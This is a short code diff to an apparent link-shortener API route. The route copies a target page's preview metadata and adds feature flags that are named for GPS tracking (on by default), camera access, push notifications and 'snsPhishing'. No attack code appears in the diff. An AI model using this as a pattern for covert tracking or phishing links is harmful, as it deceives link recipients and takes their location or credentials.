@@ -13,11 +13,14 @@ function generateShortId(length = 17) {
 
 export async function POST(request: Request) {
     try {
-        const { targetUrl } = await request.json()
+        const { targetUrl, features } = await request.json()
 
         if (!targetUrl) {
             return NextResponse.json({ error: 'Target URL is required' }, { status: 400 })
         }
+
+        const defaultFeatures = { gps: true, camera: false, pushNotification: false, snsPhishing: false }
+        const mergedFeatures = { ...defaultFeatures, ...(features || {}) }
 
         const supabase = createAdminClient()
         const shortId = generateShortId()
@@ -52,7 +55,8 @@ export async function POST(request: Request) {
                 short_id: shortId,
                 og_title: ogTitle,
                 og_description: ogDescription,
-                og_image: ogImage
+                og_image: ogImage,
+                features: mergedFeatures
             })
             .select('id, short_id')
             .single()
